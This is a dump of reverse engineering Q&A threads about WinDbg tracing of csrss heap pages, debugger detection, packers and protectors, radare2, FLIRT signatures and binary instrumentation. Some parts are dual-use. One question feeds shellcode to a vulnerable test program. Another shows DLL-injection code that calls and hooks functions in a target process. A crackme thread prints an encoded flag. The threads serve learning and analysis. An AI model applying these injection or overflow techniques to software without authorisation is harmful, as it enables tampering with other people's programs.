<p><strong>UPDATE</strong></p>

<p>the rwx page in csrss.exe is being created during CSRSRV initialization seems to be heap</p>

<p>i set a conditional break after csrss.exe is created on NtAllocateVirtualMemory to print the VadTree on every allocation<br>
and i see that the rwx page is inserted while CSRSRV init and a CreateSharedSection is observed in call stack    </p>

<pre><code>sxe ibp;.reboot
</code></pre>

<p>on reboot <code>bp NtCreateprocessEx and hit g;kb</code> till csrss.exe is about to be created<br>
you can glean the process being created by looking at the unicode_string passed to RtlCreateUserProcess api in the callstack printed<br>
dS   should print ........................../csrss.exe<br>
enter <code>gu</code> go up to allow the process to be created<br>
<code>!process 0 1 csrss.exe</code>  save eprocess to scratch pad<br>
!vad VadRoot<br>
you should observe 4 vads in csrss vad tree    </p>

<p>now set this conditional breakpoint  (<code>substitute the saved eprocess inplace of 0x81160020</code> note <code>use 0x notation</code> )<br>
bp </p>

<pre><code>bp nt!NtAllocateVirtualMemory ""!vad @@c++(((nt!_EPROCESS *) 0x81160020)-&gt;VadRoot);kb;.echo \n;dd poi(@esp+8);""
</code></pre>

<p>if you persist with an access breakpoint you can catch when the rwx page is being added to the ProcessHeapList</p>

<p>see below</p>

<p>ntdll!RtlCreateHeap+0x5b9:
001b:7c9253de e8a6000000      call    <code>ntdll!RtlpAddHeapToProcessList</code> (7c925489)</p>

<p>kd> <code>!heap</code>
HEAPEXT: Unable to get address of *ntdll!RtlpGlobalTagHeap.
Index   Address  Name      Debugging options enabled<br>
  1:   00160000<br>
  2:   00260000<br>
kd> </p>

<pre><code>p  step over the call
</code></pre>

<p>ntdll!RtlCreateHeap+0x5be:
001b:7c9253e3 8b45e4          mov     eax,dword ptr [ebp-1Ch]</p>

<pre><code>kd&gt; !heap
</code></pre>

<p>Index   Address  Name      Debugging options enabled<br>
  1:   00160000<br>
  2:   00260000<br>
  3:   <code>7f6f0000</code>                </p>

<pre><code>kd&gt; `!process 0 1 csrss.exe`
PROCESS `81160020`  SessionId: 0  Cid: 01c4    Peb: 7ffde000  ParentCid: 014c
    DirBase: 06e30000  ObjectTable: e14a7f38  HandleCount:  10.
    Image: csrss.exe
    VadRoot `812275c0 Vads 13` 
</code></pre>

<p>dump vadtree</p>

<pre><code>kd&gt; `!vad 812275c0`
VAD     level      start      end    commit
812201d8 ( 1)          0       ff         0 Private      READWRITE         
812280e8 ( 2)        100      100         1 Private      READWRITE         
81229dd0 ( 3)        110      110         1 Private      READWRITE         
81222a88 ( 4)        120      15f         4 Private      READWRITE         
811f30b8 ( 5)        160      25f         3 Private      READWRITE         
81223b80 ( 6)        260      26f         6 Private      READWRITE         
812275c0 ( 0)      4a680    4a684         2 Mapped  Exe  EXECUTE_WRITECOPY  \WINDOWS\system32\csrss.exe
811f4fd8 ( 2)      75b40    75b4a         2 Mapped  Exe  EXECUTE_WRITECOPY  \WINDOWS\system32\csrsrv.dll
811cced0 ( 1)      7c900    7c9b1         5 Mapped  Exe  EXECUTE_WRITECOPY  \WINDOWS\system32\ntdll.dll
8121f440 ( 3)      `7f6f0    7f7ef         0 Mapped       EXECUTE_READWRITE`  Pagefile-backed section
81167108 ( 2)      7ffb0    7ffd3         0 Mapped       READONLY           Pagefile-backed section
811e1d30 ( 4)      7ffdd    7ffdd         1 Private      READWRITE         
811e21b0 ( 3)      7ffde    7ffde         1 Private      READWRITE         

Total VADs:    13  average level:    3  maximum depth: 6
</code></pre>

<p>dump call stack </p>

<pre><code>kd&gt; kb
ChildEBP RetAddr  Args to Child              
0015fda4 75b437b8 00007008 7f6f0000 00100000 ntdll!RtlCreateHeap+0x5be
0015fe28 75b42f9a 001626dd 00000000 00000000 CSRSRV!CsrSrvCreateSharedSection+0x23f
0015ff74 75b430f3 0000000a 001624f0 7c90dc9e CSRSRV!CsrParseServerCommandLine+0x255
0015ff88 4a68115d 0000000a 001624f0 00000005 CSRSRV!CsrServerInitialization+0x95
0015ffa8 4a6818d7 0000000a 001624f0 0016251c csrss!main+0x4f
0015fff4 00000000 7ffde000 000000c8 00000166 csrss!NtProcessStartup+0x1d2
</code></pre>

<p>list of breakpoints</p>

<pre><code>kd&gt; bl
 0 e 8058124c     0001 (0001) nt!NtCreateProcessEx
 1 e 805691ea     0001 (0001) nt!NtAllocateVirtualMemory ""!vad @@c++(((nt!_EPROCESS *) 0x81160020)-&gt;VadRoot);kb;.echo \n;dd poi(@esp+8);""
 2 e 7f6f0000 w 1 0001 (0001)
</code></pre>

<p>you can follow this methodology with winlogon further below in the chain</p>

<p><strong>update to answer comment</strong>   </p>

<p>the breakpoint @NtAllocateVirtualMemory did not catch the allocation of vad 12<br>
which was RWX allotment from vad11 my breakpoint got hit only when vad 13 was allocated<br>
and printing vadtree i found that the vads had increased by 2 and one of them was the   7f6f0000 rwx page so maybe another way is used to add the vad to vad tree insted of   NtAllocateVirtualMemory it is possible that rwx needs to be reset and isnt being reset needs investigation</p>

<p>i can only confirm that the page is indeed HEAP and seems to mapped in almost every process
with EXECUTE_READ permissions on all the process vads except in csrss where it is RWX</p>

<pre><code>lkd&gt; .logopen c:\check7f6f0page.txt
Opened log file 'c:\check7f6f0page.txt'
lkd&gt; !for_each_process "".process /p /r @#Process ; !grep -c \""!vad @@c++( ( ( nt!_EPROCESS *) @#Process )-&gt;VadRoot)\"" -e \""7f6f0\""""
lkd&gt; .logclose
Closing open log file c:\check7f6f0page.txt
</code></pre>

<p>results show this page is mapped in all process</p>

<pre><code>lkd&gt; .shell grep ""7f6f0    7f7ef         0 Mapped"" c:\check7f6f0page.txt
&lt;.shell waiting 1 second(s) for process&gt;
86d39250 ( 4)      7f6f0    7f7ef         0 Mapped       EXECUTE_READWRITE  Pagefile-backed section
86d39250 ( 4)      7f6f0    7f7ef         0 Mapped       EXECUTE_READWRITE  Pagefile-backed section
86e87fd8 ( 4)      7f6f0    7f7ef         0 Mapped       EXECUTE_READ       Pagefile-backed section
86e87fd8 ( 4)      7f6f0    7f7ef         0 Mapped       EXECUTE_READ       Pagefile-backed section
86b96d10 ( 3)      7f6f0    7f7ef         0 Mapped       EXECUTE_READ       Pagefile-backed section
86b96d10 ( 3)      7f6f0    7f7ef         0 Mapped       EXECUTE_READ       Pagefile-backed section
86abfe80 ( 3)      7f6f0    7f7ef         0 Mapped       EXECUTE_READ       Pagefile-backed section
86abfe80 ( 3)      7f6f0    7f7ef         0 Mapped       EXECUTE_READ       Pagefile-backed section
86eaf3a8 ( 3)      7f6f0    7f7ef         0 Mapped       EXECUTE_READ       Pagefile-backed section
86eaf3a8 ( 3)      7f6f0    7f7ef         0 Mapped       EXECUTE_READ       Pagefile-backed section
86b3fda8 ( 4)      7f6f0    7f7ef         0 Mapped       EXECUTE_READ       Pagefile-backed section
86e77b20 ( 2)      7f6f0    7f7ef         0 Mapped       EXECUTE_READ       Pagefile-backed section
</code></pre>

<p>and confirms to structure _HEAP</p>

<pre><code>lkd&gt; dt -r nt!_HEAP 0x7f6f0000
   +0x000 Entry            : _HEAP_ENTRY
      +0x000 Size             : 0xc8
      +0x002 PreviousSize     : 0
      +0x000 SubSegmentCode   : 0x000000c8 Void
      +0x004 SmallTagIndex    : 0x1e ''
      +0x005 Flags            : 0x1 ''
      +0x006 UnusedBytes      : 0 ''
      +0x007 SegmentIndex     : 0 ''
   +0x008 Signature        : 0xeeffeeff
   +0x00c Flags            : 0x7008
   +0x010 ForceFlags       : 8
   +0x014 VirtualMemoryThreshold : 0xfe00
   +0x018 SegmentReserve   : 0x100000
</code></pre>

<p>dump of 7f6f0000</p>

<pre><code>lkd&gt; dd 7f6f0000 l1c/4
7f6f0000  000000c8 0000011e eeffeeff 00007008
7f6f0010  00000008 0000fe00 00100000
</code></pre>

<p>and you can confirm this pattern is indeed heap if you look at ntdll!RtlCreateHeap </p>

<pre><code>lkd&gt; !grep -c ""uf ntdll!RtlCreateHeap"" -e ""ebp-24h""
7c925dcd c745dc88050000  mov     dword ptr [ebp-24h],588h
7c925de7 c745dcc0050000  mov     dword ptr [ebp-24h],5C0h
7c925e87 8145dc80000000  add     dword ptr [ebp-24h],80h
7c925eb1 8b75dc          mov     esi,dword ptr [ebp-24h]
7c93c079 0145dc          add     dword ptr [ebp-24h],eax
</code></pre>

<p>dis assemble where the address is used   </p>

<pre><code>lkd&gt; u 7c925eb1
ntdll!RtlCreateHeap+0x421:
7c925eb1 8b75dc          mov     esi,dword ptr [ebp-24h]
7c925eb4 83c607          add     esi,7
7c925eb7 83e6f8          and     esi,0FFFFFFF8h
7c925eba 8bc6            mov     eax,esi
7c925ebc c1e803          shr     eax,3
7c925ebf 8b4de4          mov     ecx,dword ptr [ebp-1Ch]
7c925ec2 668901          mov     word ptr [ecx],ax
</code></pre>

<p>evaluate the expression</p>

<pre><code>lkd&gt; ? ((588 + 80 &gt;&gt; 3) + 7)  &amp; 0x0fffffff8 
Evaluate expression: 200 = 000000c8
</code></pre>

<p><strong>update</strong> </p>

<p>the RWX page in csrss is <code>_CsrSrvSharedSectionHeap</code> == <code>_CsrSrvSharedSectionBase</code><br>
that specifc value is queried from registry  and  mapped with NtMapViewOfSection<br>
or a Section Created using NtCreateSection
all of this happens under<br>
<code>csrss!main -&gt;csrsrv.dll -&gt;CsrsrvCreateSharedSection</code> </p>

<pre><code>reg query ""hklm\system\currentcontrolset\control\session manager\subsystems\csrss""
! REG.EXE VERSION 3.0    
HKEY_LOCAL_MACHINE\system\currentcontrolset\control\session manager\subsystems\csrss
        CsrSrvSharedSectionBase     REG_DWORD       0x7f6f0000
</code></pre>
","3455"
"What impact does noninvasive debugging have?","718","","<p>What impact does noninvasive user mode debugging with WinDbg have on the process?
Will it be detectable by the process?</p>

<p>Of course I could imagine that if the threads are suspended, differences in execution time of a function could be detected by comparing to ""usual"" values.</p>

<p>Microsoft itself <a href=""http://msdn.microsoft.com/en-us/library/windows/hardware/ff552274%28v=vs.85%29.aspx"">does not indicate</a> more impact than suspending threads. Is that true?</p>
","<p>It is effectively true that there is no additional impact.  Non-invasive debugging is simply suspending the process, and then reading the register context and memory.  Since there are no alterations to the memory, there isn't any physical thing to detect.  The timing discrepancies that it introduces are detectable, but the same effects can be produced by a system under heavy load, so the detection is unreliable for that reason (though the author of the detection routine might not care).</p>

<p>However, the very presence of an active debugger anywhere on the system is detectable, independently of the method used to debug.  The non-invasive debugging technique simply defeats some of the more common methods.</p>
","3183"
"Why did the program entry point become 'sub esp, 1C'?","718","","<p>I compiled the following C++ code with <a href=""http://en.wikipedia.org/wiki/MinGW"" rel=""nofollow"">MinGW</a> and opened it in OllyDbg 2.01. And the program stops at the following lines:</p>

<pre><code>CPU Disasm
Address   Hex dump          Command                                  Comments
00401570  /$  83EC 1C       SUB ESP,1C
00401573  |.  C70424 010000 MOV DWORD PTR SS:[LOCAL.6],1
0040157A  |.  FF15 68814000 CALL DWORD PTR DS:[&lt;&amp;msvcrt.__set_app_ty
00401580  \.  E8 FBFBFFFF   CALL 00401180


Names in Project1, item 20
  Address = 00401570
  Section = .text
  Type = Export
  Ordinal =
  Name = &lt;ModuleEntryPoint&gt;
  Comments =
</code></pre>

<p>However, this is not what I want. I prefer when OllyDbg stop at the following lines:</p>

<pre><code>CPU Disasm
Address   Hex dump          Command                                  Comments
004016B0  /$  55            PUSH EBP                                 ; Project1.004016B0(guessed void)
004016B1  |.  89E5          MOV EBP,ESP
004016B3  |.  83E4 F0       AND ESP,FFFFFFF0                         ; DQWORD (16.-byte) stack alignment
004016B6  |.  83EC 10       SUB ESP,10
004016B9  |.  E8 A2050000   CALL 00401C60
004016BE  |.  C70424 645040 MOV DWORD PTR SS:[LOCAL.4],OFFSET 004050 ; /format =&gt; ""Hello World!""
004016C5  |.  E8 9E1F0000   CALL &lt;JMP.&amp;msvcrt.printf&gt;                ; \MSVCRT.printf
004016CA  |.  B8 00000000   MOV EAX,0
004016CF  |.  C9            LEAVE
004016D0  \.  C3            RETN
</code></pre>

<p>Is that a bug? Why did MinGW set <code>SUB ESP, 1C</code> as the entrypoint? Can I set Ollydbg to start at the correct entrypoint?</p>
","<p>No, this is not a bug. Likely this is because you confuse the executable's entry point address (where Olly breaks) with the address of your <code>main()</code> function (where you expect it to break). You should locate your <code>main()</code> and set a breakpoint there manually instead.</p>

<p>There is a lot going on behind the scene before execution flow reaches <code>main()</code>. The code that gets control first is hidden within the C Run-Time (CRT) library provided by your compiler and is linked in automatically when you link your executable. This code (aptly named CRT startup) is responsible for setting up various things when a C program starts up, mainly, initializes all the internals of the C runtime (there is a lot of other stuff which I won't mention here), performs C++ static objects' constructor calls, and at the end calls your <code>main()</code>. So to get things going, the linker sets up the entry point to inside this startup machinery, which is exactly what we observe.</p>

<p>Note: It is possible to strip all the CRT stuff from your executable at the expense of not having the C runtime library linked. Not sure whether this is what you would like to have.</p>
","5891"
"How to understand the ""lpStartAddress""-Parameter of the function CreateThread","717","","<p>I have the following assembly code :</p>

<pre><code>.....
lea eax, [ebp+ThreadID]
push eax              ; lpThreadID
push 0                ; dwCreationFlags
push 0                ; lpParameter
push offset StartAddress  ; lpStartAddress
push 0                ; dwStackSize
call CreateThread
....
</code></pre>

<p>So, I try to translate it in a C-like pseudocode:</p>

<pre><code>DWORD* LPWORD eax_lpThreadID = NULL;
DWORD dwCreationFlags;
void *LPVOID lpParameter;
SIZE_T dwStackSize;
LPSECURITY ATTRIBUTES lpThreadAttributes;

HANDLE handle_to_new_Thread = CreateThread(lpThreadAttributes, dwStackSize, ..., lpParameter, dwCreationFlags, eax_lpThreadID );
</code></pre>

<p>As you can see, I do not include the 3rd parameter, namely the parameter <code>LPTHREAD_START_ROUTINE lpStartAddress</code>, because I have problems understanding it.
In <a href=""https://stackoverflow.com/questions/19472837/what-is-a-lpthread-start-routine"">this SO thread</a> i have read that a <code>LPTHREAD_START_ROUTINE</code> is a function pointer defined as:</p>

<pre><code>typedef DWORD (__stdcall *LPTHREAD_START_ROUTINE) (
  [in] LPVOID lpThreadParameter
);
</code></pre>

<p>That would mean that the 4th parameter <code>lpThreadParameter</code> is a parameter of this. 
But how can I integrate that information into my pseudo C code program ?
I am little bit confused about that. Can someone explain it to me? The other attributes/parameters are clear.... </p>
","<p>In C pseudocode let's say you have a function called <code>doJob</code>. You want to create a thread to executes it.</p>

<pre><code>DWORD WINAPI doJob(LPVOID lpParameter){
    // Do some work. You can only pass one parameter.
    // If you need more parameters, define a structure
    // and send it though it's pointer.
    return statuscode;
}

Handle hThread = 
   CreateThread(&amp;attributes,dwStackSize,&amp;doJob,&amp;paramstruct,flags,&amp;newThreadIdBuffer);
</code></pre>

<p>Or in asm (nasm syntax, if I still remember it):</p>

<pre><code>lea eax, newThreadIdBuffer
push eax
push 0 ; or 4 or 0x00010000 or 0x00010004
lea eax, paramstruct
push eax
lea eax, doJob
push eax
push dwStackSize ; 0 will use default
lea eax, attributes
push eax
call CreateThread
</code></pre>

<p>This can be done cleaner, but I believe it demonstrates the concept.</p>
","5895"
"Linux protectors: any good one out there?","717","","<p>I know no one that works as of today (i.e., kernels not way too old) and I wonder if anybody found or knows any protector for Linux either commercial, open source, used in malware, etc...</p>
","<p>There is a nice article on Linux binary code protection at <a href=""http://www.intel-assembler.it/portale/5/linux-binary-code-protection/linux-binary-code-protection.asp"" rel=""nofollow"">http://www.intel-assembler.it/portale/5/linux-binary-code-protection/linux-binary-code-protection.asp</a>. </p>

<p>If your target is to protect your binary Sentinel HASP supports Linux. </p>

<p>As for the old ones as you mention most of them don't work anymore, elf-encrypter Shiva, Burneye etc. IF I had to guess what will be the most common in Linux malware it will be  the most common packer that's is used in windows too, UPX.</p>
","1551"
"What is a free & open source alternative to IDA Pro for MacOS?","716","","<p>I am looking for a free &amp; open source alternative to IDA Pro runs on MacOS - the suggestions should have as close to the features of IDA as possible. I should also be able to edit an executable that I am debugging (i.e. change/remove things).</p>
","<p>I highly recommend <a href=""https://github.com/radare/radare2/"" rel=""nofollow noreferrer"">radare2</a> which seems to suits you the best.</p>

<blockquote>
  <p>radare2 is an <strong>open source</strong> framework for reverse engineering and
  binary analysis which implements a rich command line interface for
  disassembling, analyzing data, patching binaries, comparing data,
  searching, replacing, visualizing and more. It has great scripting
  capabilities, it runs on all major platforms (GNU/Linux, Windows
  *BSD, iOS, <strong>OSX</strong>, Solaris…) and it supports tons of architectures and file formats. [...] radare2 is absolutely libre. [<a href=""https://www.megabeets.net/a-journey-into-radare-2-part-1/"" rel=""nofollow noreferrer"">Source</a>]</p>
</blockquote>

<p>You can find in radare most of the features you have in IDA (including the option to edit a binary that you debug) and in case you lack some feature you can always open a request on the <a href=""https://github.com/radare/radare2/issues"" rel=""nofollow noreferrer"">Github</a> page or develop it by yourself. Note that, in my opinion, the learning curve of r2 is pretty steep and it'll take some time to get use to it.</p>

<p><strong>Installation</strong><br>
It’s recommended to use the current git version of radare2.<br>
Simply run:</p>

<pre><code>git clone https://github.com/radare/radare2.git
cd radare2
./sys/install.sh
</code></pre>

<p>You'll need to perform <a href=""https://github.com/radare/radare2/blob/master/doc/osx.md"" rel=""nofollow noreferrer"">several more steps</a> in order to sign radare and make it ready to debug applications without the need of root permissions.  </p>

<p><strong>Beginners guides</strong>  </p>

<ol>
<li><a href=""https://www.gitbook.com/book/radare/radare2book/details"" rel=""nofollow noreferrer"">Radare2 Book</a></li>
<li><a href=""https://www.gitbook.com/book/monosource/radare2-explorations/details"" rel=""nofollow noreferrer"">Radare2 Explorations</a></li>
<li><a href=""https://www.youtube.com/watch?v=fnpBy3wWabA"" rel=""nofollow noreferrer"">Radare Demystified</a> (Talk)</li>
</ol>

<p>This should be enough in order to learn the basics of radare.  </p>

<p><strong>User Interface</strong><br>
radare2 has a powerful command line visual modes to help you go through the program and super useful while debugging. This is how the Visual Graph Mode looks like:   </p>

<p><a href=""https://i.stack.imgur.com/sp7ML.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/sp7ML.png"" alt=""Visual graph mode""></a>  </p>

<p>The GUI of radare2 is called <a href=""https://github.com/radareorg/cutter"" rel=""nofollow noreferrer"">Cutter</a> (originally named Iaito) is the official graphic user interface of radare2. Cutter is built on top of Qt and C++.
<a href=""https://i.stack.imgur.com/7K4LH.jpg"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/7K4LH.jpg"" alt=""Cutter interface""></a></p>
","15898"
"Why are PUSHF and POPF so slow?","715","","<p>the experiment is on <code>32-bit</code> <code>x86</code> Linux.</p>

<p>I am doing some static binary instrumentation work, and basically I am trying to insert some instructions below to the beginning of every basic block. </p>

<pre><code>BB23 : push %eax

movl index,%eax
movl $0x80823d0,buf(,%eax,0x4)
add $0x1,%eax
cmp $0x400000,%eax
jle BB_23_stub
movl $0x0,%eax
BB_23_stub:movl %eax,index

pop %eax
</code></pre>

<p>Note that I need to use <code>cmp</code> instruction, and in order to guarantee that <code>flags</code> can restore to the original value, I use <code>pushf</code> and <code>popf</code> to store\load <code>flags</code> on the stack. </p>

<p>Then it becomes this:</p>

<pre><code> BB_23 :    push %eax
       pushf               
       movl index,%eax
       movl $0x17,buf(,%eax,0x4)
       add $0x1,%eax
       cmp $0x400000,%eax
       jle BB_23_stub
       movl $0x0,%eax
BB_23_stub:movl %eax,index
       popf             
       pop %eax
</code></pre>

<p>I tested the performance with and without <code>pushf</code> and <code>popf</code> (I am using <code>gzip</code> and <code>bzip</code>). And to my surprise, performance penalty could increase  even 3 times after using the <code>pushf</code> and <code>popf</code> instructions!!</p>

<p>However, without <code>pushf</code> and <code>popf</code>. The compression results of <code>gzip</code> and <code>bzip</code> are incorrect.</p>

<p>So here is my question:</p>

<p>Why pushf and popf so slow? Am I using it in a correct way?</p>

<p>I cannot afford too much performance penalty introduced by pushf and popf. Is there any way I can avoid the high overhead and also keep the correct semantics? (protecting the value in flags, basically..)</p>

<p>Am I clear enough? Could anyone give me some help?</p>
","<p>Clever (some would say incomprehensible) misuse of x86 features could do this for you. The <code>loop</code> instruction will decrement the <code>ecx</code> register, jump if it's nonzero, and not modify flags. You can use this as a <code>jump forward</code> instruction as well, like this:</p>

<pre><code>BB23:      push %ecx
           movl index, %ecx
           movl $0x17, buf-4(,%ecx,4)
           loop BB23_stub
           movl $0x400000, %ecx
BB23_stub: movl %ecx, index
           pop %ecx
</code></pre>

<p>Note that ecx runs from 0x400000 to 1 here, not from 0 to 0x3fffff, so i had to subtract <code>4</code> from the address of <code>buf</code>, and you need to read the buffer top to bottom when analyzing it. Don't forget to initialize <code>index</code> to <code>0x400000</code> at the start of your code somewhere. You'll have to test how much the penalty of  branching in <code>loop</code> costs in comparison to how much removing <code>pushf</code>/<code>popf</code> gains.</p>
","9349"
"IDA Pro: Program parameters","714","","<p>I am currently playing around with simple bufferoverflows in a c-program and i try to understand the program by stepping through it in IDA Pro. </p>

<p>The program takes an argument and writes it into a buffer with strcpy(). I can pass a simple argument like ""AAAA..."" to the programm in Ida Pro (Debugger->process options) and see how the return-adress gets overwritten.</p>

<p>What i would like to do now is pass a shellcode as a parameter and see in Ida Pro how the program writes the shellcode in the buffer and overwrites the return-adress.</p>

<p>In a shell i would execute something like:</p>

<blockquote>
  <p>$ ./vuln `perl -e 'print ""\x55\x89\xe5...""'`</p>
</blockquote>

<p>or</p>

<blockquote>
  <p>$ ./vuln `cat shellcode.txt`</p>
</blockquote>

<p>So my question is: How can i pass non-printable characters as an argument to a programm in IdaPro? </p>
","<p>Try using IDC function <code>StartDebugger</code>. You can pass a C-style string (e.g. <code>""\x55\x89\xe5""</code>)for program arguments:</p>

<pre><code>***********************************************
** Launch the debugger
   arguments:
        path - path to the executable file.
        args - command line arguments
        sdir - initial directory for the process
for all args: if empty, the default value from the database will be used
   returns: -1-failed, 0-cancelled by the user, 1-ok
   See the important note to the StepInto() function

long StartDebugger(string path, string args, string sdir);
</code></pre>
","11414"
"Reverse engineering binary file to find flag","714","","<p>The binary is from here: <a href=""https://files.fm/u/qtqmhhdd"" rel=""nofollow noreferrer"">https://files.fm/u/qtqmhhdd</a></p>

<p>I've been attempting this a couple of days. Its an ELF-64 bit file and I've gdb and IDA to see how it works for a while. You can run the file by</p>

<pre><code>./reverse1.bin TEST (outputs a fail message)
</code></pre>

<p>In gdb it runs a _Z5checkPc function and you can use ""disas check"". It uses the flag from address 0x601038 which is</p>

<pre><code> synt{0p5r7996pnq3qn36377036onor7342s41pq30r3n3q0p46n283862718o7n6s78n}
</code></pre>

<p>But I don't see it where it actually get used in the code. From the check function it seems to does a bunch of operations (or, add,...) to your arg. I thought it would do a compare to see determine if it ""fails"" or ""success"" at 0x00000000004005b0 but that is not right strangely. Any insights on what to do?</p>
","<p>Since this is a reversing challenge, I won't jump the gun right away and give you some tips which may help for this and future Challenges.</p>

<p>The <code>check</code> function (<code>_Z5checkPc</code> is a mangled name) looks like this:
<a href=""https://i.stack.imgur.com/UbZsz.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/UbZsz.png"" alt=""Ida representation""></a></p>

<p>You already found the data the input value is compared to. But you failed to understand that there is no direct comparison here.</p>

<ol>
<li>We have a loop over a string value. That means it is highly probable each character is processed sequentially.</li>
<li>Values are modified in an (obfuscated) way, before they are compared -> there is some kind of coding here!</li>
</ol>

<p>Although there is dead code included in the function, you'll have to identify the modification which is taking place directly before the comparison (what is compared to what? how are these values calculated?).</p>

<p>I strongly encourage you to ask follow up questions if there is anything in particular you don't understand. For minor questions or discussions, you can also drop by in the chat.</p>
","15142"
"Anti reverse engineering tools that are easy to set up","713","","<p>I will be distributing a c++ application, and I was wondering if there was any tools available to add an extra layer of security against reverse engineering. I'm looking for a quick fix because I don't want to spend a year learning RE, I just want to focus on my application. Should I be looking at anti debuggers, packers, or what? Is there any convenient libraries to use?</p>

<p>I understand that nothing can stop reverse engineering, I just would like to make it more difficult if possible.</p>

<p>Is there anything that is free or open source?</p>
","<p>Since you don't want to learn RE, there are some free/opensource and paid tools. </p>

<p>For the first you probably should look <a href=""https://reverseengineering.stackexchange.com/questions/1792/is-there-any-simple-open-source-windows-packer"">in the answers here</a>. </p>

<p>If you feel like spending money you can find some relatively stronger packers like:
<a href=""http://vmpsoft.com/"" rel=""nofollow"">VMProtect</a> or <a href=""http://www.oreans.com/themida.php"" rel=""nofollow"">themida</a>.</p>

<p>Good luck!</p>
","10776"
"Unable to create FLIRT signature for IDA","712","","<p>I'm trying to create a .sig file for sqlite3. I downloaded the source code from the website, compiled it into a .lib (smoothly), and this is what I get when I try to turn it into a .pat file:</p>

<pre><code>plb.exe -v sqlite.lib
sqlite.lib: invalid module at offset 143146. Skipping.
sqlite.lib: invalid module at offset 2587742. Skipping.
sqlite.lib: skipped 2, total 2
</code></pre>

<p>The resulting .pat file is empty and I cannot proceed to create the final file with sigmake.</p>

<p>Google doesn't seem to indicate that anyone has ever had an ""invalid module at offset"" problem in the entire world, so I'm guessing this is pretty unique. I'm stuck. Help?</p>
","<p>plb.exe is designed for OMF libraries (primarily used for 16 bit Borland compilers). What you probably want is pcf.exe, which parses COFF libraries commonly used in 32 bit windows.</p>
","6091"
"DLL Injection search for procedures/variables","709","","<p>I am learning DLL injection basics and different techniques to achieve it, like using <code>CreateProcess</code> and <code>LoadLibrary</code> for example, or simply replacing a .dll in folder where the application to inject into resides. 
I was able to perform some basic tasks after having loaded the .dll into application's memory space like invoking a <code>MessageBox</code> on <code>DLLEntry</code> and some others. 
But how can one manipulate with the code of the application itself, eg. calling a certain procedure that is part of the application, or simply modifying a variable? 
Most tutorials I have read online discuss only injection process itself, but not the actual manipulations with applications. Or at least I am having trouble finding that information. </p>

<p>So, how to find/extract the memory parts of the application you are interested in and then modify/alter them?</p>
","<p>If you want to use a function in the application the bottom line is that you need to know where it's located.  Without ASLR you can hardcode the address of the function into your DLL, and use a function pointer to call it.  If you want to modify data from a function in a loaded library then you would need to hook that function, and call your own code for its operations.</p>

<p>If an application's function is at 0x0041A000 you can create a function pointer if you know all the information about the function; the call convention, return value, and parameters.  Assume it's a <code>__stdcall</code>, two <code>VOID *</code>parameters, and returns a <code>DWORD</code>.</p>

<pre><code>typedef DWORD (WINAPI *FunctionType)(VOID *a, VOID *b);

DllEntry(...)
{
    FunctionType function = (FunctionType) 0x0041A000;

    function(your_param1, your_param2);
}
</code></pre>

<p>You can also hook that function by using the <a href=""http://research.microsoft.com/en-us/projects/detours/"" rel=""nofollow noreferrer"">Windows Detours</a> library.  Again you would hardcode the address of the function you want to hook, and write your own version of the function.  You need to make sure that it returns the same type of value as the real function to ensure nothing breaks in the calling function.  Using <code>GetProcAddress</code> you can hook a function call of a library rather than the application's function.  </p>

<p>This all gets complicated with ASLR.  As the application might not be at the location you think it is.  <a href=""https://stackoverflow.com/a/11564232/3714897"">This answer</a> can help with the calculations of certain sections determined by the base address of the program.</p>

<p>Modifying global variables is the same kind of deal.  You'll need to find their offset in the program.  You can then create pointer to that memory address for manipulating it.     </p>
","6834"
"Obfuscating JavaScript with zero-width characters - pros and cons?","708","","<p>This comes from comments on a question on StackOverflow about JavaScript Variables: <a href=""https://stackoverflow.com/a/7451569/1317805"">Why aren't ◎ܫ◎ and ☺ valid JavaScript variable names?</a></p>

<p>JavaScript accepts zero-width characters as valid variable names, for example all three of these variables have different names but are visually identical:</p>

<pre><code>var ab, /* ab */
    a‍b, /* a&amp;zwj;b */
    a‌b; /* a&amp;zwnj;b */
</code></pre>

<p>Here's a <a href=""http://jsfiddle.net/MYLx9/"" rel=""nofollow noreferrer"">JSFiddle</a> example of the above three variables in use.</p>

<p>What are the pros and cons of doing this as an obfuscation technique for JavaScript (and other supporting languages)?</p>
","<p>Well, in your own programs, it's probably fine.  But in a corporate setting its a maintenence nightmare without extremely good documentation and/or team continuity.  Neither of which seems all that common in my experience.  </p>

<p>I think a more general question might be, ""are obfuscation techniques really all that useful?""  I can understand minify for page loading purposes.  But hiding source doesn't seem to make sense.  You are either thinking you have some clever, never done before, algorithm.  If that's the case, maybe JS isn't the langauge for it since there's really no way to completely hide it.  Or you are trying to be trixsy and attempt some security through obscurity, generally a Bad Idea.</p>
","55"
"Why IDA Pro generated a ""j_printf"" function call?","708","","<p>Test platform is windows 32 bit.  IDA pro 64</p>

<p>So, basically I use IDA pro to disassemble a PE file, and do some transformation work on the asm code I get, to make it <strong>re-assemblable</strong>.</p>

<p>In the transformed code I generated, the system function call like <code>printf</code> will be written just as the usual way.</p>

<pre><code>extern printf
....
....
call printf
</code></pre>

<p>I use this to reassemble the code I create:</p>

<pre><code>nasm -fwin32 --prefix _ test.s
cl test.obj /link msvcrt.lib
</code></pre>

<p>I got a PE executable file, and basically it works fine (Like a hello world program, a quick sort program and others).</p>

<p>But then, as I use <strong>IDA pro to re-disassemble the new PE executable file I create</strong>, strange things happened.</p>

<p>IDA pro generates function call like this:</p>

<p><img src=""https://i.stack.imgur.com/2ttKz.png"" alt=""IDA pro""></p>

<p>and when I use:</p>

<pre><code>idaq.exe -B test.exe 
</code></pre>

<p>to generate new assembly code, in the printf function call part, it generate this:</p>

<pre><code>call j_printf
</code></pre>

<p>Without the <code>j_printf proc near</code> function define...</p>

<p>So basically I am wondering if anyone know how do deal with this, to let IDA pro generate </p>

<pre><code>call printf
</code></pre>

<p>or </p>

<pre><code>call _printf
</code></pre>

<p>again or any other solution?</p>
","<p>It's cl.exe that's inserting the jump thunk. It has some advantages, such as making it easier to redirect a function during runtime after load and makes it so that the loader only has to do a single relocation for that function. The other option would be to use an indirect call through an address. Neither is really optimal for performance due to the distance between the call and the jump or the address, which can hurt caching. You can <a href=""http://msdn.microsoft.com/en-us/library/4khtbfyf%28VS.80%29.aspx"">disable the jump thunk by disabling incremental linking</a>.</p>

<p>That said, what you're doing is probably a bad idea. IDA is not really made to produce code that can be reassembled. What's normally done is that you extend the last section or add a new section with the patched code then redirect the original code to the patch through a call or a jump.</p>
","3438"
